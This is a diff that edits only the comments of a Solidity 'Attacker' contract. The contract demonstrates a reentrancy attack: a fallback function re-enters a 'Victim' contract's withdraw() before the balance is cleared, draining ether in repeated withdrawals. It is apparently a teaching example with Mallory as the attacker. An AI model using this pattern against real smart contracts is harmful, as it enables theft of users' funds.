@@ -69,19 +69,22 @@ contract Attacker {
 
   event fallbackCalled(uint c, uint balance);
 
+  // Construct this contract with the victim's address.
   constructor(address payable victimAddress) public {
      victim = Victim(victimAddress);
 
   }
-  // Mallory calls attack and attack makes one withdraw
-  // But, the Victim's withdraw passes ether to our fallback function.
+  // Mallory calls attack and attack makes one withdraw.
+  // Mallory gets 1 eth added to the eth account of this contract by
+  // making this call.
+  // But, the Victim's withdraw passes ether to Mallory's fallback function.
   // That function calls withdraw() again before the victim's
   // code clears the balance.
   function attack() public  {
     victim.withdraw();
   }
 
-  // collects Ether
+  // collects Ether for counter = 1..9.
   function() payable external {
     counter++;
     emit fallbackCalled(counter,msg.value);
